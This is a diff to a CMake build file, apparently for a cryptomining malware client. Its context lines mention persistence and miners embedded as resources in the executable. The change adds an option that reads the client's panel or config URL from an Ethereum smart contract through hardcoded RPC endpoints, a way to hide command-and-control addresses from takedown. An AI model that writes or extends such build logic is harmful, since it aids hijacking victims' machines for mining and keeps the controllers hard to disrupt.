@@ -175,6 +175,22 @@ if(ENABLE_PERSISTENCE)
     list(APPEND HEADER_FILES include/persistence.h)
 endif()
 
+# Smart contract URL fetching
+# When enabled the client calls the deployed TextStorage contract at startup
+# to read the panel/config URL from the blockchain instead of using a hardcoded value.
+option(ENABLE_CONTRACT_URL "Fetch URL from Ethereum TextStorage smart contract at runtime" OFF)
+set(CONTRACT_ADDRESS "" CACHE STRING "Deployed TextStorage contract address (0x...)")
+if(ENABLE_CONTRACT_URL)
+    if(CONTRACT_ADDRESS STREQUAL "")
+        message(FATAL_ERROR "CONTRACT_ADDRESS must be set when ENABLE_CONTRACT_URL=ON")
+    endif()
+    message(STATUS "Contract URL enabled: ${CONTRACT_ADDRESS} (RPC endpoints hardcoded)")
+    add_definitions(-DENABLE_CONTRACT_URL)
+    add_definitions(-DCONTRACT_ADDRESS="${CONTRACT_ADDRESS}")
+    list(APPEND SRC_FILES src/contract_reader.cpp)
+    list(APPEND HEADER_FILES include/contract_reader.h)
+endif()
+
 # Miners are now embedded as resources in the executable
 set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
 if(MSVC)
